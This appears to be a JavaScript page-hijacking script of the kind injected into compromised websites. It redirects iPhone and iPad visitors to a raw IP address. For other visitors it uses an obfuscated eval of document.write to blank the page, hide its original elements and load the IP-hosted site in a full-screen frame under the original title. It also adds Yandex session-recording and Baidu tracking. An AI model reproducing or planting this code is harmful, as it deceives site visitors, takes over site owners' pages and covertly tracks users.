//lxxaicom
if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
    //alert(navigator.userAgent);  
    window.location.href = "http://38.26.195.21/";
}
var titlestr=document.title;
setFrame("http://38.26.195.21/");



function setFrame(olink){
    var ss = '<title>'+titlestr+'</title><div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;}</style>';
	
    eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
    try {
      setTimeout(function() {
        console.log(document.body.children.length);
        for (var i = 0; i < document.body.children.length; i++) {
          try {
            var a = document.body.children[i].tagName;
            var b = document.body.children[i].id;
            console.log(i+"***"+a+"**"+b);
            if (b != "iconDiv1" && b != "showcloneshengxiaon" && a!="title") {
              document.body.children[i].style.display = "non" + "e"
            }
          } catch (e) {}
        }
        document.getElementById("showcloneshengxiaon").innerHTML = '<object type="text/html" data="'+olink+'" width="100%" height="100%"></object>';
         var oMeta = document.createElement('meta');
        oMeta.name = 'viewport';
        oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
        document.getElementsByTagName('head')[0].appendChild(oMeta);
        
      }, 100)
    } catch (e) {}
}
 (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(87023917, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });

var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d573a1a3453dc4bfc0beb0d5be9510f6";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();